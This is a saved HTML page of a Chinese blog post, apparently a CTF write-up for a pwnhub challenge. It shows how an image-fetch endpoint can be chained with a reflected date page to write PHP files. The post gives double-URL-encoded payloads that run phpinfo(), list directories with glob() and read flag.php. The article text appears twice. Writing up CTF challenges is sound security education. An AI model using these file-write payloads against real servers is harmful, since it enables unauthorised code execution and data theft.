@@ -1,0 +1,294 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<title>Bendawang's Site</title>
+<link href="./pwnhub——胖哈勃外传-第一集-writeup/font-awesome.min.css" rel="stylesheet"/>
+<link href="./pwnhub——胖哈勃外传-第一集-writeup/screen.css" rel="stylesheet"/>
+<link href="./pwnhub——胖哈勃外传-第一集-writeup/prism_okaidia.css" rel="stylesheet"/>
+<link href="./pwnhub——胖哈勃外传-第一集-writeup/bendawang.css" rel="stylesheet"/>
+<script src="./pwnhub——胖哈勃外传-第一集-writeup/jquery.min.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+<div class="show-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img src="./pwnhub——胖哈勃外传-第一集-writeup/bendawang.png" style="display:block;width:100%;"/></a>
+</h1>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit test2 hide-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img alt="" height="115" src="./pwnhub——胖哈勃外传-第一集-writeup/bendawang.png" width="449"/></a>
+</h1>
+</div>
+<nav class="main-nav unit test1 hide-on-mobiles">
+<ul>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+</div>
+</header>
+<script>
+$('document').ready(function(){
+    $('li[class]:eq(4)').attr('class','current');
+});
+</script>
+<section class="docs">
+<div class="grid">
+<!--移动端-->
+<div class="show-on-mobiles">
+<div class="article-info profile-block">
+<div class="article-info-block">
+               55
+               <span>文章</span>
+</div>
+<div class="article-info-block">
+               5
+               <span>标签</span>
+</div>
+</div>
+<div class="profile-block social-links">
+<table>
+<tbody><tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i></a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i></a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i></a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody></table>
+</div>
+<div class="whole show-on-mobiles">
+<article class="bdw_article">
+<div class="Bendawang" id="Bendawang_mobile">
+<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
+<div class="Bendawang_content" id="Bendawang_content_mobile"></div>
+
+<br/>
+<br/>
+<p style="max-width:100%;height:auto;">前三次都忘了报名了，第四次那个csrf那个题当时已经想对了，也绕过了，但是最后迫于信安技术作业和ppt的压力结果最后没有做完，也是蛮遗憾的。</p>
+<p style="max-width:100%;height:auto;">这次终于有机会在补seccon的空隙把这一期的题做了。不过这一期的题目相对来说要比前几期简单些。</p>
+<p style="max-width:100%;height:auto;">首先看看网站。在首页的源码里面有这样一部分很奇怪</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;script src="http://54.223.231.220/image.php?file=http://127.0.0.1:8888/test.png&amp;path=logo.jpg"&gt;&lt;/script&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">访问下，说是logo.jpg更新成功。</p>
+<p style="max-width:100%;height:auto;">试了几下，发现以下几点</p>
+<ul>
+<li><p style="max-width:100%;height:auto;">首先这个链接是访问<code style="max-width:100%;height:auto;">file</code>指向的链接，并将返回的内容写到path指向的文件</p></li>
+<li><p style="max-width:100%;height:auto;"><code style="max-width:100%;height:auto;">file</code>指向的连接必须是127.0.0.1的，不太好绕过</p></li>
+<li><p style="max-width:100%;height:auto;"><code style="max-width:100%;height:auto;">path</code>可以是.php后缀的文件，但是过滤的尖括号，没有办法二次访问直接webshell。</p></li>
+</ul>
+<p style="max-width:100%;height:auto;">综上思路就是想办法在本站下找一个地方可以写webshell的，然后通过这个<code style="max-width:100%;height:auto;">image.php</code>直接写webshell。</p>
+<p style="max-width:100%;height:auto;">但是刚才说了没有办法二次访问<code style="max-width:100%;height:auto;">image.php</code>直接写webshell。</p>
+<p style="max-width:100%;height:auto;">所以还要另外找地方。</p>
+<p style="max-width:100%;height:auto;">然后发现这个地方<code style="max-width:100%;height:auto;">http://54.223.231.220/?date/2016-07/</code>，</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./pwnhub——胖哈勃外传-第一集-writeup/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">日期被直接打印出来了，那么我们试试，果然这里可以打印链接上的内容，所以构造poc如下：(注意要二次url编码)</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">http://54.223.231.220/image.php?file=http%3A%2f%2f127.0.0.1%3A8888%2f%3Fdate%2f2016-07%253C%253Fphp%2520%2520phpinfo%2528%2529%253B%2520%253F%253E%2f&amp;path=bendawang.php
+</code></pre>
+<p style="max-width:100%;height:auto;">访问<code style="max-width:100%;height:auto;">http://54.223.231.220/bendawang.php</code>，截图如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./pwnhub——胖哈勃外传-第一集-writeup/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">成功了，那么看看被禁用的函数：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,fopen,fread,fwrite,eval,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen,assert
+</code></pre>
+<p style="max-width:100%;height:auto;">几乎所有执行命令的函数都被禁用了。</p>
+<p style="max-width:100%;height:auto;">那么先用<code style="max-width:100%;height:auto;">glob</code>遍历下目录把</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://54.223.231.220/image.php?file=http%3A%2f%2f127.0.0.1%3A8888%2f%3Fdate%2f2016-07%253C%253Fphp%2520%2520foreach%2528glob%2528%2522.%252f%252a%2522%2529%2520as%2520%2524bdw%2529%257B%2520%2520echo%2520%2524bdw.%2522%253Cbr%253E%2522%253B%2520%257D%253F%253E%2f&amp;path=bendawang.php
+</code></pre>
+<p style="max-width:100%;height:auto;">访问截图如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./pwnhub——胖哈勃外传-第一集-writeup/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">发现一个<code style="max-width:100%;height:auto;">flag.php</code>,直接读取内容看看，poc如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://54.223.231.220/image.php?file=http%3A%2f%2f127.0.0.1%3A8888%2f%3Fdate%2f2016-07%253C%253Fphp%2520%2520echo%2520file_get_contents%2528%2527flag.php%2527%2529%253B%253F%253E%2f&amp;path=bendawang.php
+</code></pre>
+<p style="max-width:100%;height:auto;">截图如下，拿到flag</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./pwnhub——胖哈勃外传-第一集-writeup/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+
+
+
+<!--PC端-->
+<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
+<div class="inner profile-inner">
+<div class="base-info profile-block">
+<img id="avatar" src="./pwnhub——胖哈勃外传-第一集-writeup/logo.jpg"/>
+<h2 id="name" style="text-align:center">Bendawang</h2>
+<span id="location" style="font-size:18px">
+<i class="fa fa-map-marker"></i>SiChuan, China</span>
+<a href="/about" id="follow">联系我</a></div>
+<div class="article-info profile-block">
+<div class="article-info-block">
+        55
+          <span>文章</span></div>
+<div class="article-info-block">
+        5
+          <span>标签</span></div>
+</div>
+<div class="profile-block social-links hide-on-mobiles">
+<table>
+<tbody>
+<tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i>
+</a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i>
+</a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i>
+</a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<div class="unit three-quarters hide-on-mobiles">
+<article class="bdw_article">
+<p style="max-width:100%;height:auto;">前三次都忘了报名了，第四次那个csrf那个题当时已经想对了，也绕过了，但是最后迫于信安技术作业和ppt的压力结果最后没有做完，也是蛮遗憾的。</p>
+<p style="max-width:100%;height:auto;">这次终于有机会在补seccon的空隙把这一期的题做了。不过这一期的题目相对来说要比前几期简单些。</p>
+<p style="max-width:100%;height:auto;">首先看看网站。在首页的源码里面有这样一部分很奇怪</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;script src="http://54.223.231.220/image.php?file=http://127.0.0.1:8888/test.png&amp;path=logo.jpg"&gt;&lt;/script&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">访问下，说是logo.jpg更新成功。</p>
+<p style="max-width:100%;height:auto;">试了几下，发现以下几点</p>
+<ul>
+<li><p style="max-width:100%;height:auto;">首先这个链接是访问<code style="max-width:100%;height:auto;">file</code>指向的链接，并将返回的内容写到path指向的文件</p></li>
+<li><p style="max-width:100%;height:auto;"><code style="max-width:100%;height:auto;">file</code>指向的连接必须是127.0.0.1的，不太好绕过</p></li>
+<li><p style="max-width:100%;height:auto;"><code style="max-width:100%;height:auto;">path</code>可以是.php后缀的文件，但是过滤的尖括号，没有办法二次访问直接webshell。</p></li>
+</ul>
+<p style="max-width:100%;height:auto;">综上思路就是想办法在本站下找一个地方可以写webshell的，然后通过这个<code style="max-width:100%;height:auto;">image.php</code>直接写webshell。</p>
+<p style="max-width:100%;height:auto;">但是刚才说了没有办法二次访问<code style="max-width:100%;height:auto;">image.php</code>直接写webshell。</p>
+<p style="max-width:100%;height:auto;">所以还要另外找地方。</p>
+<p style="max-width:100%;height:auto;">然后发现这个地方<code style="max-width:100%;height:auto;">http://54.223.231.220/?date/2016-07/</code>，</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./pwnhub——胖哈勃外传-第一集-writeup/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">日期被直接打印出来了，那么我们试试，果然这里可以打印链接上的内容，所以构造poc如下：(注意要二次url编码)</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">http://54.223.231.220/image.php?file=http%3A%2f%2f127.0.0.1%3A8888%2f%3Fdate%2f2016-07%253C%253Fphp%2520%2520phpinfo%2528%2529%253B%2520%253F%253E%2f&amp;path=bendawang.php
+</code></pre>
+<p style="max-width:100%;height:auto;">访问<code style="max-width:100%;height:auto;">http://54.223.231.220/bendawang.php</code>，截图如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./pwnhub——胖哈勃外传-第一集-writeup/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">成功了，那么看看被禁用的函数：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,fopen,fread,fwrite,eval,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen,assert
+</code></pre>
+<p style="max-width:100%;height:auto;">几乎所有执行命令的函数都被禁用了。</p>
+<p style="max-width:100%;height:auto;">那么先用<code style="max-width:100%;height:auto;">glob</code>遍历下目录把</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://54.223.231.220/image.php?file=http%3A%2f%2f127.0.0.1%3A8888%2f%3Fdate%2f2016-07%253C%253Fphp%2520%2520foreach%2528glob%2528%2522.%252f%252a%2522%2529%2520as%2520%2524bdw%2529%257B%2520%2520echo%2520%2524bdw.%2522%253Cbr%253E%2522%253B%2520%257D%253F%253E%2f&amp;path=bendawang.php
+</code></pre>
+<p style="max-width:100%;height:auto;">访问截图如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./pwnhub——胖哈勃外传-第一集-writeup/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">发现一个<code style="max-width:100%;height:auto;">flag.php</code>,直接读取内容看看，poc如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://54.223.231.220/image.php?file=http%3A%2f%2f127.0.0.1%3A8888%2f%3Fdate%2f2016-07%253C%253Fphp%2520%2520echo%2520file_get_contents%2528%2527flag.php%2527%2529%253B%253F%253E%2f&amp;path=bendawang.php
+</code></pre>
+<p style="max-width:100%;height:auto;">截图如下，拿到flag</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./pwnhub——胖哈勃外传-第一集-writeup/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles godness">
+<aside>
+<div class="Bendawang" id="Bendawang" style="position:absolute;">
+<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
+<div class="Bendawang_content" id="Bendawang_content"></div>
+
+<img class="yukino" id="yukino" src="./pwnhub——胖哈勃外传-第一集-writeup/41.png" style="position:absolute;"/>
+
+
+
+
+<footer>
+<div class="show-on-mobiles">
+<div style="display:inline-block">
+<div style="vertical-align:middle;">
+            Copyright©
+            <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
+</div>
+</div>
+<div style="vertical-align:middle;">
+<span>Designed By</span>
+<a href="http://blog.csdn.net/qq_19876131"><img src="./pwnhub——胖哈勃外传-第一集-writeup/bendawang2.png"/></a>
+</div>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit one-third center-on-mobiles">
+<div class="copyright">
+          Copyright©
+          <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
+</div>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>Designed By
+          <a href="http://blog.csdn.net/qq_19876131">
+<img src="./pwnhub——胖哈勃外传-第一集-writeup/bendawang2.png"/>
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script src="./pwnhub——胖哈勃外传-第一集-writeup/prism.js"></script>
+<script src="./pwnhub——胖哈勃外传-第一集-writeup/zooming.js"></script>
+<script src="./pwnhub——胖哈勃外传-第一集-writeup/Bendawang.js"></script>
+
+
